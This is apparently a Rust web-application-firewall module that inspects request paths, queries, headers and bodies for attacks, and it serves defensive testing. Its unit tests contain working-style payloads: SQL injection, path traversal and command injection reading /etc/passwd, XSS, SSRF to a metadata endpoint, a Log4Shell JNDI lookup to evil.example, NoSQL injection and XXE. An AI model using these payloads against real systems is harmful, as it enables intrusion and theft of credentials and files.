use std::borrow::Cow;

use exposure_core::config::{WafCategory, WafConfig, WafMode};
use http::{header, HeaderMap, Method};
use sigil_filter::{AttackDetector, CategoryMask, DetectionResult, ScanInput, ViolationCategory};

/// Hard ceiling on request body bytes buffered for WAF inspection (prevents OOM DoS).
pub const WAF_HARD_MAX_BODY_BYTES: usize = 256 * 1024;
/// Header/URI buffer length thresholds (high enough for JWT cookies/long query strings,
/// while still catching NOP sleds, format strings, repeated padding, and oversized floods).
const HEAD_OVERFLOW_WARN_LEN: usize = 4096;
const HEAD_OVERFLOW_CRIT_LEN: usize = 8192;

#[derive(Debug, Clone)]
pub struct WafFinding {
    pub category: &'static str,
    pub location: &'static str,
    pub confidence: f32,
    pub reasons: Vec<&'static str>,
}

impl WafFinding {
    pub fn telemetry_reason(&self) -> String {
        format!("waf:{}:{}", self.category, self.location)
    }
}

#[derive(Debug, Clone)]
pub enum WafVerdict {
    Allow,
    Monitor(WafFinding),
    Block(WafFinding),
}

impl WafVerdict {
    pub fn is_block(&self) -> bool {
        matches!(self, WafVerdict::Block(_))
    }
}

pub fn category_to_sigil(cat: WafCategory) -> ViolationCategory {
    match cat {
        WafCategory::SqlInjection => ViolationCategory::SqlInjection,
        WafCategory::Xss => ViolationCategory::Xss,
        WafCategory::PathTraversal => ViolationCategory::PathTraversal,
        WafCategory::CommandInjection => ViolationCategory::CommandInjection,
        WafCategory::NoSqlInjection => ViolationCategory::NoSqlInjection,
        WafCategory::Ssrf => ViolationCategory::Ssrf,
        WafCategory::Ssti => ViolationCategory::SstiAndCodeInjection,
        WafCategory::Xxe => ViolationCategory::XxeAndXmlInjection,
        WafCategory::LdapInjection => ViolationCategory::LdapInjection,
        WafCategory::CrlfInjection => ViolationCategory::CrlfAndHeaderInjection,
        WafCategory::Deserialization => ViolationCategory::DeserializationAndPrototypePollution,
        WafCategory::BufferOverflow => ViolationCategory::BufferOverflow,
    }
}

pub fn sigil_category_label(cat: ViolationCategory) -> &'static str {
    match cat {
        ViolationCategory::BufferOverflow => "buffer-overflow",
        ViolationCategory::PathTraversal => "path-traversal",
        ViolationCategory::SqlInjection => "sql-injection",
        ViolationCategory::NoSqlInjection => "nosql-injection",
        ViolationCategory::Xss => "xss",
        ViolationCategory::CommandInjection => "command-injection",
        ViolationCategory::LdapInjection => "ldap-injection",
        ViolationCategory::XxeAndXmlInjection => "xxe",
        ViolationCategory::SstiAndCodeInjection => "ssti",
        ViolationCategory::Ssrf => "ssrf",
        ViolationCategory::CrlfAndHeaderInjection => "crlf-injection",
        ViolationCategory::DeserializationAndPrototypePollution => "deserialization",
        ViolationCategory::Custom(name) => name,
    }
}

fn build_category_mask(categories: &[WafCategory]) -> CategoryMask {
    if categories.is_empty() {
        return CategoryMask::ALL;
    }
    let mut mask = 0u16;
    for &c in categories {
        mask |= category_to_sigil(c).bit();
    }
    CategoryMask(mask)
}

#[inline]
fn mask_without(mask: CategoryMask, excluded: ViolationCategory) -> CategoryMask {
    CategoryMask(mask.0 & !excluded.bit())
}

/// Checks whether a request path is exempt from WAF inspection.
/// Prefix matching respects `/` segment boundaries unless the exempt prefix itself ends with `/`.
pub fn is_path_exempt(path: &str, exempt_paths: &[String]) -> bool {
    for raw in exempt_paths {
        let p = raw.trim();
        if p.is_empty() {
            continue;
        }
        if p == "/" {
            return true;
        }
        if p.ends_with('/') {
            if path.starts_with(p) {
                return true;
            }
        } else if path == p || path.starts_with(&format!("{p}/")) {
            return true;
        }
    }
    false
}

/// Returns `Some(max_body_bytes)` when the request body should be buffered & inspected by WAF.
/// Binary/multipart uploads and WebSocket upgrades are intentionally skipped to preserve streaming.
pub fn should_inspect_body(
    cfg: &WafConfig,
    method: &Method,
    headers: &HeaderMap,
    is_upgrade: bool,
) -> Option<usize> {
    if cfg.mode == WafMode::Off || !cfg.inspect_body || is_upgrade {
        return None;
    }
    if !matches!(*method, Method::POST | Method::PUT | Method::PATCH) {
        return None;
    }
    let limit = cfg.max_body_bytes.min(WAF_HARD_MAX_BODY_BYTES);
    if limit == 0 {
        return None;
    }
    // Skip clearly non-textual binary/multipart payloads (images, files, gRPC, octet-stream)
    if let Some(ct) = headers
        .get(header::CONTENT_TYPE)
        .and_then(|v| v.to_str().ok())
    {
        if !is_text_inspectable_content_type(ct) {
            return None;
        }
    }
    Some(limit)
}

fn is_text_inspectable_content_type(ct: &str) -> bool {
    let media = ct
        .split(';')
        .next()
        .unwrap_or("")
        .trim()
        .to_ascii_lowercase();
    if media.is_empty() {
        return true;
    }
    media.starts_with("text/")
        || media == "application/json"
        || media.ends_with("+json")
        || media == "application/x-www-form-urlencoded"
        || media == "application/xml"
        || media.ends_with("+xml")
        || media == "application/graphql"
        || media == "application/javascript"
        || media == "application/ecmascript"
}

#[inline]
fn verdict_from_result(
    mode: WafMode,
    location: &'static str,
    res: DetectionResult,
) -> Option<WafVerdict> {
    let cat = res.violation?;
    let reasons = res
        .violations
        .first()
        .map(|v| v.reasons.clone())
        .unwrap_or_default();
    let finding = WafFinding {
        category: sigil_category_label(cat),
        location,
        confidence: res.confidence,
        reasons,
    };
    Some(match mode {
        WafMode::Off => WafVerdict::Allow,
        WafMode::Monitor => WafVerdict::Monitor(finding),
        WafMode::Block => WafVerdict::Block(finding),
    })
}

#[inline]
fn replace_plus_with_space(s: &str) -> Cow<'_, str> {
    if s.as_bytes().contains(&b'+') {
        Cow::Owned(s.replace('+', " "))
    } else {
        Cow::Borrowed(s)
    }
}

/// Inspect HTTP request head (URI path, query string, and selected request headers) using `sigil-filter`.
pub fn inspect_request_head(
    cfg: &WafConfig,
    path: &str,
    query: Option<&str>,
    headers: &HeaderMap,
) -> WafVerdict {
    if cfg.mode == WafMode::Off || is_path_exempt(path, &cfg.exempt_paths) {
        return WafVerdict::Allow;
    }

    let min_c = cfg.min_confidence.clamp(0.1, 1.0);
    let detector = AttackDetector::new()
        .with_min_confidence(min_c)
        .with_buffer_limits(HEAD_OVERFLOW_WARN_LEN, HEAD_OVERFLOW_CRIT_LEN);
    let mask = build_category_mask(&cfg.categories);

    // 1. URI path
    if !path.is_empty() && path != "/" {
        let res = detector.detect(ScanInput::new(path).with_mask(mask));
        if let Some(v) = verdict_from_result(cfg.mode, "path", res) {
            return v;
        }
    }

    // 2. Query string (scan individual key/value pairs + raw query)
    if let Some(q) = query.filter(|q| !q.is_empty()) {
        for pair in q.split('&') {
            if pair.is_empty() {
                continue;
            }
            let (k, v_opt) = match pair.split_once('=') {
                Some((k, v)) => (k, Some(v)),
                None => (pair, None),
            };
            let k_norm = replace_plus_with_space(k);
            let res = detector.detect(ScanInput::new(k_norm.as_ref()).with_mask(mask));
            if let Some(verdict) = verdict_from_result(cfg.mode, "query", res) {
                return verdict;
            }
            if let Some(v) = v_opt.filter(|v| !v.is_empty()) {
                let v_norm = replace_plus_with_space(v);
                let res = detector.detect(ScanInput::new(v_norm.as_ref()).with_mask(mask));
                if let Some(verdict) = verdict_from_result(cfg.mode, "query", res) {
                    return verdict;
                }
            }
            // Also scan the full `key=value` pair (catches MongoDB `user[$ne]=admin`, etc.)
            let pair_norm = replace_plus_with_space(pair);
            let res = detector.detect(ScanInput::new(pair_norm.as_ref()).with_mask(mask));
            if let Some(verdict) = verdict_from_result(cfg.mode, "query", res) {
                return verdict;
            }
        }
        // Catch cross-param/oversized query payloads
        let q_norm = replace_plus_with_space(q);
        let res = detector.detect(ScanInput::new(q_norm.as_ref()).with_mask(mask));
        if let Some(verdict) = verdict_from_result(cfg.mode, "query", res) {
            return verdict;
        }
    }

    // 3. Selected HTTP headers (with HTTP-aware category masks to avoid false positives on benign browsers)
    if cfg.inspect_headers {
        // User-Agent: exclude PathTraversal because standard Windows browser UAs contain `/` + `Windows`
        let ua_mask = mask_without(mask, ViolationCategory::PathTraversal);
        for hv in headers.get_all(header::USER_AGENT) {
            if let Ok(s) = hv.to_str() {
                let res = detector.detect(ScanInput::new(s).with_mask(ua_mask));
                if let Some(v) = verdict_from_result(cfg.mode, "header:user-agent", res) {
                    return v;
                }
            }
        }

        // Referer: exclude Ssrf because browsing from localhost/127.0.0.1 sets `Referer: http://127.0.0.1/...`
        let referer_mask = mask_without(mask, ViolationCategory::Ssrf);
        for hv in headers.get_all(header::REFERER) {
            if let Ok(s) = hv.to_str() {
                let res = detector.detect(ScanInput::new(s).with_mask(referer_mask));
                if let Some(v) = verdict_from_result(cfg.mode, "header:referer", res) {
                    return v;
                }
            }
        }

        // Cookie: split on `;` so standard `a=1; id=2` cookie delimiters don't look like shell `; id` chains
        for hv in headers.get_all(header::COOKIE) {
            if let Ok(raw_cookie) = hv.to_str() {
                for item in raw_cookie.split(';') {
                    let trimmed = item.trim();
                    if trimmed.is_empty() {
                        continue;
                    }
                    let val = trimmed
                        .split_once('=')
                        .map(|(_, v)| v.trim())
                        .unwrap_or(trimmed);
                    if val.is_empty() {
                        continue;
                    }
                    let res = detector.detect(ScanInput::new(val).with_mask(mask));
                    if let Some(v) = verdict_from_result(cfg.mode, "header:cookie", res) {
                        return v;
                    }
                }
            }
        }

        // Proxy / rewrite headers frequently targeted by Log4Shell, SSRF, CRLF, or path-override attacks
        for (h_name, loc) in [
            ("x-original-url", "header:x-original-url"),
            ("x-rewrite-url", "header:x-rewrite-url"),
            ("x-forwarded-for", "header:x-forwarded-for"),
            ("x-forwarded-host", "header:x-forwarded-host"),
            ("forwarded", "header:forwarded"),
        ] {
            for hv in headers.get_all(h_name) {
                if let Ok(s) = hv.to_str() {
                    let res = detector.detect(ScanInput::new(s).with_mask(mask));
                    if let Some(v) = verdict_from_result(cfg.mode, loc, res) {
                        return v;
                    }
                }
            }
        }
    }

    WafVerdict::Allow
}

/// Inspect buffered HTTP request body bytes (`POST`/`PUT`/`PATCH`) using `sigil-filter`.
pub fn inspect_request_body(
    cfg: &WafConfig,
    content_type: Option<&str>,
    body: &[u8],
) -> WafVerdict {
    if cfg.mode == WafMode::Off || !cfg.inspect_body || body.is_empty() {
        return WafVerdict::Allow;
    }

    let limit = cfg.max_body_bytes.min(WAF_HARD_MAX_BODY_BYTES);
    if limit == 0 {
        return WafVerdict::Allow;
    }
    let slice = &body[..body.len().min(limit)];
    let text = match std::str::from_utf8(slice) {
        Ok(s) => s,
        Err(e) => {
            // If truncated mid-UTF8 codepoint at `limit`, inspect the valid prefix
            let valid = e.valid_up_to();
            if valid == 0 {
                return WafVerdict::Allow;
            }
            match std::str::from_utf8(&slice[..valid]) {
                Ok(s) => s,
                Err(_) => return WafVerdict::Allow,
            }
        }
    };

    let min_c = cfg.min_confidence.clamp(0.1, 1.0);
    // Raise length-only overflow thresholds above `limit` so benign JSON/form payloads within
    // `max_body_bytes` do not trip length warnings, while NOP sleds, format strings, and huge
    // repeated byte runs are still caught.
    let body_warn = limit.saturating_add(1).max(HEAD_OVERFLOW_WARN_LEN);
    let body_crit = body_warn.saturating_add(1);
    let detector = AttackDetector::new()
        .with_min_confidence(min_c)
        .with_buffer_limits(body_warn, body_crit);
    let mask = build_category_mask(&cfg.categories);

    let is_form = content_type
        .map(|ct| {
            ct.split(';')
                .next()
                .unwrap_or("")
                .trim()
                .eq_ignore_ascii_case("application/x-www-form-urlencoded")
        })
        .unwrap_or(false);

    if is_form {
        for pair in text.split('&') {
            if pair.is_empty() {
                continue;
            }
            let pair_norm = replace_plus_with_space(pair);
            let res = detector.detect(ScanInput::new(pair_norm.as_ref()).with_mask(mask));
            if let Some(v) = verdict_from_result(cfg.mode, "body", res) {
                return v;
            }
            if let Some((_, val)) = pair.split_once('=') {
                if !val.is_empty() {
                    let val_norm = replace_plus_with_space(val);
                    let res = detector.detect(ScanInput::new(val_norm.as_ref()).with_mask(mask));
                    if let Some(v) = verdict_from_result(cfg.mode, "body", res) {
                        return v;
                    }
                }
            }
        }
        return WafVerdict::Allow;
    }

    let res = detector.detect(ScanInput::new(text).with_mask(mask));
    verdict_from_result(cfg.mode, "body", res).unwrap_or(WafVerdict::Allow)
}

#[cfg(test)]
mod tests {
    use super::*;
    use http::HeaderValue;

    fn block_cfg() -> WafConfig {
        WafConfig {
            mode: WafMode::Block,
            ..Default::default()
        }
    }

    #[test]
    fn benign_browser_and_api_requests_pass_without_false_positives() {
        let cfg = block_cfg();
        let mut headers = HeaderMap::new();
        headers.insert(
            header::USER_AGENT,
            HeaderValue::from_static(
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
            ),
        );
        headers.insert(
            header::REFERER,
            HeaderValue::from_static("http://127.0.0.1:8080/dashboard?tab=services"),
        );
        headers.insert(
            header::COOKIE,
            HeaderValue::from_static(
                "exposure_clearance=eyJhbGciOiJIUzI1NiJ9.payload.sig; id=42; theme=dark",
            ),
        );

        let v = inspect_request_head(
            &cfg,
            "/api/v1/services/web-main",
            Some("page=2&limit=50&sort=updated_at&q=hello+world"),
            &headers,
        );
        assert!(matches!(v, WafVerdict::Allow), "unexpected verdict: {v:?}");

        let large_json = format!(
            r#"{{"items":[{}],"note":"Please select your preferred package (20% off today)"}}"#,
            (0..80)
                .map(|i| format!(r#"{{"id":{i},"name":"item_{i}","active":true}}"#))
                .collect::<Vec<_>>()
                .join(",")
        );
        assert!(large_json.len() > 2500);
        let bv = inspect_request_body(&cfg, Some("application/json"), large_json.as_bytes());
        assert!(matches!(bv, WafVerdict::Allow), "unexpected body verdict: {bv:?}");
    }

    #[test]
    fn blocks_common_web_attacks_across_path_query_headers_and_body() {
        let cfg = block_cfg();
        let empty = HeaderMap::new();

        // SQLi in query (both %20 and + space encoding)
        assert!(inspect_request_head(&cfg, "/search", Some("q=admin'+OR+'1'='1'+--"), &empty).is_block());
        assert!(inspect_request_head(
            &cfg,
            "/items",
            Some("id=1%20UNION%20SELECT%20username,password%20FROM%20users"),
            &empty
        )
        .is_block());

        // Path Traversal in path
        assert!(inspect_request_head(&cfg, "/files/../../../../etc/passwd", None, &empty).is_block());

        // XSS in query
        assert!(inspect_request_head(
            &cfg,
            "/profile",
            Some("bio=%3Csvg%20onload%3Dalert(1)%3E"),
            &empty
        )
        .is_block());

        // Command Injection in query
        assert!(inspect_request_head(&cfg, "/ping", Some("host=1.1.1.1;cat${IFS}/etc/passwd"), &empty).is_block());

        // SSRF in query
        assert!(inspect_request_head(
            &cfg,
            "/fetch",
            Some("url=http://169.254.169.254/latest/meta-data/"),
            &empty
        )
        .is_block());

        // Log4Shell / JNDI in User-Agent
        let mut log4j_hdrs = HeaderMap::new();
        log4j_hdrs.insert(
            header::USER_AGENT,
            HeaderValue::from_static("${jndi:ldap://evil.example/Exploit}"),
        );
        match inspect_request_head(&cfg, "/", None, &log4j_hdrs) {
            WafVerdict::Block(f) => {
                assert_eq!(f.category, "deserialization");
                assert_eq!(f.location, "header:user-agent");
            }
            other => panic!("expected block, got {other:?}"),
        }

        // NoSQL injection in JSON body
        let nosql = br#"{"username":{"$ne":null},"password":{"$gt":""}}"#;
        match inspect_request_body(&cfg, Some("application/json"), nosql) {
            WafVerdict::Block(f) => {
                assert_eq!(f.category, "nosql-injection");
                assert_eq!(f.location, "body");
            }
            other => panic!("expected block, got {other:?}"),
        }

        // SQLi in form-urlencoded body with `+` spaces
        let form = b"user=admin'+OR+'1'='1'+--&pass=123";
        assert!(inspect_request_body(&cfg, Some("application/x-www-form-urlencoded"), form).is_block());

        // XXE in XML body
        let xxe = br#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><r>&xxe;</r>"#;
        assert!(inspect_request_body(&cfg, Some("application/xml"), xxe).is_block());
    }

    #[test]
    fn respects_modes_categories_and_exempt_paths() {
        let empty = HeaderMap::new();

        // Off mode allows everything
        let off = WafConfig {
            mode: WafMode::Off,
            ..Default::default()
        };
        assert!(matches!(
            inspect_request_head(&off, "/../../etc/passwd", None, &empty),
            WafVerdict::Allow
        ));

        // Monitor mode reports finding without blocking
        let mon = WafConfig {
            mode: WafMode::Monitor,
            ..Default::default()
        };
        assert!(matches!(
            inspect_request_head(&mon, "/search", Some("q=<script>alert(1)</script>"), &empty),
            WafVerdict::Monitor(f) if f.category == "xss"
        ));

        // Category filter: SQLi-only ignores XSS but blocks SQLi
        let sqli_only = WafConfig {
            mode: WafMode::Block,
            categories: vec![WafCategory::SqlInjection],
            ..Default::default()
        };
        assert!(matches!(
            inspect_request_head(&sqli_only, "/search", Some("q=<script>alert(1)</script>"), &empty),
            WafVerdict::Allow
        ));
        assert!(inspect_request_head(&sqli_only, "/search", Some("q=' OR '1'='1"), &empty).is_block());

        // Exempt path respects segment boundary
        let exempt = WafConfig {
            mode: WafMode::Block,
            exempt_paths: vec!["/api/webhooks".into()],
            ..Default::default()
        };
        assert!(matches!(
            inspect_request_head(&exempt, "/api/webhooks/stripe", Some("q=' OR '1'='1"), &empty),
            WafVerdict::Allow
        ));
        assert!(
            inspect_request_head(&exempt, "/api/webhooks-other", Some("q=' OR '1'='1"), &empty)
                .is_block()
        );
    }

    #[test]
    fn skips_binary_and_multipart_body_inspection() {
        let cfg = block_cfg();
        let mut h_multi = HeaderMap::new();
        h_multi.insert(
            header::CONTENT_TYPE,
            HeaderValue::from_static("multipart/form-data; boundary=----abc"),
        );
        assert!(should_inspect_body(&cfg, &Method::POST, &h_multi, false).is_none());

        let mut h_json = HeaderMap::new();
        h_json.insert(header::CONTENT_TYPE, HeaderValue::from_static("application/json; charset=utf-8"));
        assert_eq!(
            should_inspect_body(&cfg, &Method::POST, &h_json, false),
            Some(32 * 1024)
        );
        assert!(should_inspect_body(&cfg, &Method::GET, &h_json, false).is_none());
        assert!(should_inspect_body(&cfg, &Method::POST, &h_json, true).is_none());
    }
}
